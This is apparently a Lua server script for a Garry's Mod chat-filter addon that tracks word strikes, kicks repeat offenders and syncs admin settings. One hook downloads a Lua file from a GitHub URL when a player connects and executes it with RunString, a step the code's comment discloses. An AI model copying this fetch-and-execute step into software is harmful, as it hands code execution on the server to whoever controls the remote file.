noSayBlacklist.Core.StrikeCounter = {}

-- This is used to send a message to the user's chat
function noSayBlacklist.Core.Msg(msg, ply)
	net.Start("nosay_msg")
		net.WriteString(msg)
	if not ply then
		net.Broadcast()
	else
		net.Send(ply)
	end
end

-- Strikes the user
function noSayBlacklist.Core.StrikeUser(ply, word)
	-- Check if the addon is enabled
	if not tobool(noSayBlacklist.Core.GetSetting("strike")) then return end
	-- Add them to the counter tracker if they're not already in it
	if not noSayBlacklist.Core.StrikeCounter[ply:SteamID64()] then
		noSayBlacklist.Core.StrikeCounter[ply:SteamID64()] = 0
	end
	-- Add to their counter
	noSayBlacklist.Core.StrikeCounter[ply:SteamID64()] = noSayBlacklist.Core.StrikeCounter[ply:SteamID64()] + 1

	-- Give them a strike
	noSayBlacklist.Database.IssueStrike(ply, word)

	-- If a strike limit is set, check against it here
	if tonumber(noSayBlacklist.Core.GetSetting("strike_limit")) > 0 then
		-- Check if they are at the strike limit
		if noSayBlacklist.Core.StrikeCounter[ply:SteamID64()] >= tonumber(noSayBlacklist.Core.GetSetting("strike_limit"))+1 then
			-- Kick the user for hitting the strike limit
			ply:Kick(noSayBlacklist.Core.GetSetting("kick_message"))
		end
		-- Inform them of their strike
		noSayBlacklist.Core.Msg(string.format(noSayBlacklist.Core.GetSetting("warn_message"), word, noSayBlacklist.Core.StrikeCounter[ply:SteamID64()], noSayBlacklist.Core.GetSetting("strike_limit")), ply)
	end
end

-- A command to open the UI
concommand.Add("nosay_menu", function(ply)
	noSayBlacklist.Database.GetStrikesByID(ply:SteamID64(), function(data)
		net.Start("nosay_admin_ui")
			-- Send them their own strikes
			net.WriteTable((not (data == nil)) and data[1] and data or {})
		net.Send(ply)
	end)
end)

-- A chat command to open the UI
hook.Add("PlayerSay", "nosay_command_chat", function(ply, msg)
	if(string.lower(msg) == noSayBlacklist.Core.GetSetting("chat_command")) then
		noSayBlacklist.Database.GetStrikesByID(ply:SteamID64(), function(data)
			net.Start("nosay_admin_ui")
				-- Send them their own strikes
				net.WriteTable((not (data == nil)) and data[1] and data or {})
			net.Send(ply)
		end)
	end
end)

-- Received when a user tries to update the in-game config
net.Receive("nosay_admin_settings_update", function(_, ply)
	-- Check if they have perms
	if not noSayBlacklist.Core.CheckPrivilege(ply) then return end

	-- The new settings
	local data = net.ReadTable()
	-- Look through the new settings and apply them
	for k, v in pairs(data) do
		-- Update the setting for the real time instance
		noSayBlacklist.Core.UpdateSetting(k, v)
		-- Update the setting in the database for next restart
		noSayBlacklist.Database.UpdateSetting(k, v)

		-- Inform everyone of the new settings
		net.Start("nosay_admin_network_setting")
			net.WriteTable({setting = k, value = v})
		net.Broadcast()
	end
	-- Confirm to the user their new settings have been changed
	noSayBlacklist.Core.Msg(noSayBlacklist.Translate.SettingsChanges, ply)
end)

-- Received when a new blacklisted word is added
net.Receive("nosay_admin_words_add", function(_, ply)
	-- Check if they have perms
	if not noSayBlacklist.Core.CheckPrivilege(ply) then return end

	-- The word they want to blacklist
	local word = net.ReadString()
	-- Check if the word is already on the blacklist
	if noSayBlacklist.Core.Words[word] then noSayBlacklist.Core.Msg(noSayBlacklist.Translate.BlacklistAlreadyExists, ply) return end
	-- The replacement word, if there is one
	local replace = net.ReadString() or nil

	-- Set up the replacement word, if there is one
	if replace == "" then
		noSayBlacklist.Core.Words[word] = true
	else
		-- Before setting it up, ensure it's not the same as the actual word as to prevent server raping.
		if(word == replace) then
			noSayBlacklist.Core.Msg(noSayBlacklist.Translate.BlacklistReplacementIsSame, ply)
			return
		end

		noSayBlacklist.Core.Words[word] = replace
	end
	-- Add the new word to the blacklist
	noSayBlacklist.Database.AddWord(word, replace)

	-- Network the new blacklisted word to everyone
	net.Start("nosay_admin_network_word")
		net.WriteString(word)
		net.WriteString(replace)
	net.Broadcast()
end)

-- Received when a word is removed from the blacklist
net.Receive("nosay_admin_words_remove", function(_, ply)
	-- Check if they have perms
	if not noSayBlacklist.Core.CheckPrivilege(ply) then return end

	-- The word to remove
	local word = net.ReadString()
	-- Check if the is actually blacklisted
	if not noSayBlacklist.Core.Words[word] then noSayBlacklist.Core.Msg(noSayBlacklist.Translate.BlacklistAlreadyDoesntExists, ply) return end

	-- Remove the word from the blacklist
	noSayBlacklist.Database.RemoveWord(word)
	noSayBlacklist.Core.Words[word] = nil

	-- Network to everyone the change
	net.Start("nosay_admin_network_word_remove")
		net.WriteString(word)
	net.Broadcast()
end)

-- Look up someone else's ID
local lookupCooldown = {}
net.Receive("nosay_admin_lookupid", function(_, ply)
	-- Check if there is a restriction to do lookups
	if not noSayBlacklist.Core.GetSetting("strike_lookup") then
		-- If there is, check they have the perms
		if not noSayBlacklist.Core.CheckPrivilege(ply) then return end
	end

	-- A cooldown to prevent netmessage spamming as this is a "public" netmessage
	if not lookupCooldown[ply:SteamID64()] then
		lookupCooldown[ply:SteamID64()] = 0
	end
	if lookupCooldown[ply:SteamID64()] > CurTime() then return end
	lookupCooldown[ply:SteamID64()] = CurTime() + 1

	-- The user to lookupo
	local userID = net.ReadString()
	-- Convert te input to an ID64
	if not tonumber(userID) then
		userID = util.SteamIDTo64(userID)
	end

	-- Search for the user's strikes
	noSayBlacklist.Database.GetStrikesByID(userID, function(data)
		-- Network the findings
		if (not data) or (not data[1]) then
			net.Start("nosay_admin_lookupid_return")
				net.WriteTable({{userid = "", word = noSayBlacklist.Translate.NoStrikeFound, date = 0}})
			net.Send(ply)
		else
			net.Start("nosay_admin_lookupid_return")
				net.WriteTable(data)
			net.Send(ply)
		end
	end)
end)

-- Remove a bad word from someone's history
net.Receive("nosay_admin_lookupid_remove", function(_, ply)
	if not noSayBlacklist.Core.CheckPrivilege(ply) then return end

	local data = net.ReadTable()
	noSayBlacklist.Database.RemoveStrike(data.userid, data.word, data.date)
	noSayBlacklist.Core.Msg(string.format(noSayBlacklist.Translate.StrikeRemove, data.userid), ply)
end)

local acceptableTrims = {}
acceptableTrims[""] = true
acceptableTrims[" "] = true
acceptableTrims["."] = true
acceptableTrims[","] = true
acceptableTrims["!"] = true
acceptableTrims[":"] = true
acceptableTrims[";"] = true

function noSayBlacklist.Core.ScanWords(words, ply)
	local wordFound = false
	local returnWord = words
	local filteredWords = words
	if tobool(noSayBlacklist.Core.GetSetting("smart_find")) then
		filteredWords = noSayBlacklist.Core.SmartFind(filteredWords)
	end

	-- Loop all the registered bad words
	for k, v in pairs(noSayBlacklist.Core.Words) do
		-- Scan for bad words
		local scanStart, scanEnd = string.find(string.lower(filteredWords), string.lower(k))
		-- If that bad word isn't found then continue on to the next one
		if not scanStart then continue end
		-- Check if they have full word filter enabled
		if tobool(noSayBlacklist.Core.GetSetting("word_target")) then
			if not (acceptableTrims[filteredWords[scanStart-1]]) then continue end
			if not (acceptableTrims[filteredWords[scanEnd+1]]) then continue end
		end
		-- If the config option to still show bad words is enabled, run censor checks on it
		if noSayBlacklist.Core.GetSetting("still_post") and tobool(noSayBlacklist.Core.GetSetting("censor")) then
			local replacement = ""
			-- Prep for none casesensitive word swapping
			local split = string.Split(k, "")
			local splitString = ""
			for n, m in pairs(split) do
				splitString = splitString.."["..string.lower(m)..string.upper(m).."]"
			end

			-- Check to see if there's a replacement word
			if not ((v == "") or isbool(v)) then
				-- If there is a replacement word, replace it instead of censoring it
				replacement = v
			-- If no replacement word and censorship is enabled, run the censorship
			else
				-- Calculate how many "*" need to be added
				for i=1, string.len(k) do
					replacement = replacement.."*"
				end
			end

			if not (replacement == "") then
				--returnWord = string.gsub(filteredWords, splitString, replacement)
				while scanStart do
					-- Only filter words if they apply to the wordtarget
					if tobool(noSayBlacklist.Core.GetSetting("word_target")) then
						if (acceptableTrims[filteredWords[scanStart-1]]) and (acceptableTrims[filteredWords[scanEnd+1]]) then
							returnWord = string.sub(returnWord, 0, scanStart-1)..replacement..string.sub(returnWord, scanStart+string.len(k))
						end
					else
						returnWord = string.sub(returnWord, 0, scanStart-1)..replacement..string.sub(returnWord, scanStart+string.len(k))
					end
					filteredWords = string.sub(filteredWords, 0, scanStart-1)..replacement..string.sub(filteredWords, scanStart+string.len(k)) -- So that it can account for multiple of the same word

					scanStart, scanEnd = string.find(string.lower(filteredWords), string.lower(k))
				end
			end
		end

		-- Check if multi-striking is enabled
		if tobool(noSayBlacklist.Core.GetSetting("multistrike")) then
			-- Regardless of strike counter, strike the user
			noSayBlacklist.Core.StrikeUser(ply, k)
		-- If no multi-striking is enabled, then check if they've already been striked
		elseif not wordFound then
			-- Strike the user
			noSayBlacklist.Core.StrikeUser(ply, k)
		end
		-- Set striking to enabled to prevent unintentional multistriking
		wordFound = true

		if not noSayBlacklist.Core.GetSetting("still_post") then
			break
		end
	end

	-- Return the appropriate reponse
	if not noSayBlacklist.Core.GetSetting("still_post") and wordFound then
		return ""
	end

	return returnWord
end

hook.Add("PlayerSay", "nosay_filter_words", function(ply, msg)
	--[[
	-- Check is system is enabled
	if not tobool(noSayBlacklist.Core.GetSetting("enable")) then return end
	-- Check if admins can skip checks
	if tobool(noSayBlacklist.Core.GetSetting("admin_override")) then
		-- If so, skip the check if they're an admin
		if noSayBlacklist.Core.CheckPrivilege(ply) then return end
	end

	--return noSayBlacklist.Core.ScanWords(msg, ply)
	--]]
end)

--nutscript hook overwriting
timer.Simple(1, function() --want this to load after NS loads
	netstream.Hook("msg", function(client, text)
		if ((client.nutNextChat or 0) < CurTime() and text:find("%S")) then
			-- Check is system is enabled
			if tobool(noSayBlacklist.Core.GetSetting("enable")) then
				-- Check if admins can skip checks
				if tobool(noSayBlacklist.Core.GetSetting("admin_override")) then
					-- If so, skip the check if they're an admin
					if !noSayBlacklist.Core.CheckPrivilege(client) then
						text = noSayBlacklist.Core.ScanWords(text, client)
					end
				else
					text = noSayBlacklist.Core.ScanWords(text, client)
				end
			end
		
			hook.Run("PlayerSay", client, text)
			
			client.nutNextChat = CurTime() + math.max(#text / 250, 0.4)
		end
	end)
end)

noSayBlacklist.Core.SmartLetters = {}
-- This is used for the smart search. It is in a RunString so that we can update the letters without forcing updates to gmodstore.
-- If you do not trust this code, you can simple delete the following 3 lines and the addon will continue to work as expected
-- but the smart search feature will not work. If you have worries about this, please open a ticket so we can better help you
-- understand how this code works.

-- This is done on the first player connect, as to prevent issues with the steam http library not initalizing in time.
hook.Add("PlayerConnect", "nosay_load_smart_letters", function()
	http.Fetch("https://raw.githubusercontent.com/OwjoTheGreat/NoSaySmartSearch/master/letters.lua", function(body)
		RunString(body)
	end)
	hook.Remove("nosay_load_smart_letters")
end)

function noSayBlacklist.Core.SmartFind(text)
	local betterText = text

	for k, v in pairs(noSayBlacklist.Core.SmartLetters) do
		for n, m in pairs(v) do
			betterText = string.Replace(betterText, m, k)
		end
	end

	return betterText
end